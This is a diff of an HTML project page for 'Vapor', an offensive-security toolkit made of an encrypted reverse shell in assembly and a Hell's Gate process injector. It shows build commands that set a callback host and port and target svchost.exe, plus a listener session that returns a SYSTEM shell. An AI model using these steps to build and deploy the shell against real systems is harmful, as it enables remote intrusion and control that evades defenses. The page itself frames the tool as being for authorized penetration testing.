-        <div class="start-line"><span class="comment"># Build with random key (shellcode + PE + injector)</span></div>
-        <div class="start-line"><span class="prompt">$</span> <span class="cmd">./build.sh </span><span class="arg">10.10.14.1 443</span></div>
-        <div class="start-spacer"></div>
-        <div class="start-line"><span class="comment"># Or use make directly</span></div>
-        <div class="start-line"><span class="prompt">$</span> <span class="cmd">make </span><span class="flag">LHOST=</span><span class="arg">10.10.14.1 </span><span class="flag">LPORT=</span><span class="arg">443 </span><span class="flag">KEY=</span><span class="arg">&lt;64-hex-chars&gt; </span><span class="cmd">all</span></div>
-        <div class="start-spacer"></div>
-        <div class="start-line"><span class="comment"># Build injector with custom target process</span></div>
-        <div class="start-line"><span class="prompt">$</span> <span class="cmd">make </span><span class="flag">TARGET=</span><span class="str">"C:\Windows\System32\svchost.exe" </span><span class="cmd">all</span></div>
-        <div class="start-spacer"></div>
-        <div class="start-line"><span class="comment"># Start listener</span></div>
-        <div class="start-line"><span class="prompt">$</span> <span class="cmd">python3 listener.py </span><span class="flag">--lport </span><span class="arg">443 </span><span class="flag">--key </span><span class="arg">&lt;key&gt;</span></div>
-        <div class="start-spacer"></div>
-        <div class="start-line"><span class="comment"># Outputs: vapor.bin + vapor.exe + injector.exe</span></div>
-      </div>
-    </div>
-  </section>
+            <div class="two-col">
+                <div class="terminal">
+                    <div class="terminal-bar">
+                        <span class="terminal-dot"></span>
+                        <span class="terminal-dot"></span>
+                        <span class="terminal-dot"></span>
+                        <span class="terminal-label">build.sh</span>
+                    </div>
+                    <div class="terminal-body">
+                        <pre><span class="c"># Clone and build</span>
+<span class="p">$</span> git clone https://github.com/Real-Fruit-Snacks/Vapor.git
+<span class="p">$</span> cd Vapor
 
-</div><!-- /.page-wrap -->
+<span class="c"># Build with auto-generated PSK</span>
+<span class="p">$</span> ./build.sh 10.10.14.1 443
+<span class="v">[*] Generated PSK: a1b2c3d4...</span>
+<span class="v">[*] Assembled vapor.bin (3,612 bytes)</span>
+<span class="v">[*] Linked vapor.exe</span>
+<span class="v">[*] Built injector.exe</span>
 
-<!-- ============ FOOTER ============ -->
-<footer class="site-footer">
-  <div class="page-wrap">
-    <p class="footer-tagline">Pure assembly. Fully encrypted.</p>
-    <p class="footer-sub">Vapor &mdash; ChaCha20-Poly1305 reverse shell in ~3.6 KB + Hell's Gate injector</p>
-    <div class="footer-links">
-      <a href="https://github.com/Real-Fruit-Snacks/Vapor">GitHub</a>
-      <a href="#architecture">Documentation</a>
-    </div>
-    <p class="footer-copy">x86_64 NASM &middot; Windows &middot; RFC 8439 AEAD &middot; Hell's Gate &middot; Indirect Syscalls</p>
-    <p class="footer-copy" style="margin-top: 16px; max-width: 600px; margin-left: auto; margin-right: auto; line-height: 1.5;"><strong style="color: var(--ctp-subtext1);">For authorized use only.</strong> This tool is intended for legitimate security research, authorized penetration testing, and educational purposes. Unauthorized access to computer systems is illegal. Users are solely responsible for ensuring compliance with all applicable laws and obtaining proper authorization before use.</p>
-  </div>
-</footer>
+<span class="c"># Or with your own key</span>
+<span class="p">$</span> ./build.sh 10.10.14.1 443 &lt;64-hex-chars&gt;</pre>
+                    </div>
+                </div>
+
+                <div class="terminal">
+                    <div class="terminal-bar">
+                        <span class="terminal-dot"></span>
+                        <span class="terminal-dot"></span>
+                        <span class="terminal-dot"></span>
+                        <span class="terminal-label">deploy.sh</span>
+                    </div>
+                    <div class="terminal-body">
+                        <pre><span class="c"># Start listener (operator machine)</span>
+<span class="p">$</span> python3 listener.py --lport 443 --key &lt;psk&gt;
+<span class="v">[*] Listening on 0.0.0.0:443</span>
+<span class="v">[+] Connection from 10.10.10.5:49152</span>
+
+<span class="c"># Execute commands</span>
+<span class="p">vapor&gt;</span> whoami
+<span class="v">nt authority\system</span>
+
+<span class="p">vapor&gt;</span> ipconfig
+<span class="v">IPv4 Address: 10.10.10.5</span><span class="cursor"></span></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ════════════════════ FOOTER ════════════════════ -->
+    <footer>
+        <div class="container">
+            <div class="footer-grid">
+                <div>
+                    <h4>Documentation</h4>
+                    <ul>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Vapor#quick-start">Quick Start</a></li>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Vapor#injector">Injector</a></li>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Vapor#wire-protocol">Wire Protocol</a></li>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Vapor#architecture">Architecture</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4>Resources</h4>
+                    <ul>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Vapor/releases/latest">Latest Release</a></li>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Vapor/issues">Report Issue</a></li>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Vapor/blob/main/CONTRIBUTING.md">Contributing</a></li>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Vapor/blob/main/CHANGELOG.md">Changelog</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4>Toolkit</h4>
+                    <ul>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Aquifer">Aquifer</a></li>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Siphon">Siphon</a></li>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Dew">Dew</a></li>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Droplet">Droplet</a></li>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Undercurrent">Undercurrent</a></li>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Flux">Flux</a></li>
+                        <li><a href="https://github.com/Real-Fruit-Snacks/Grotto">Grotto</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4>License</h4>
+                    <p>MIT License<br>Copyright &copy; 2026 Real-Fruit-Snacks<br><br>Built with pure x86_64 NASM assembly</p>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                Part of the Real-Fruit-Snacks security toolkit &nbsp;&middot;&nbsp; With great power comes great responsibility.
+            </div>
+        </div>
+    </footer>
 
 </body>
 </html>
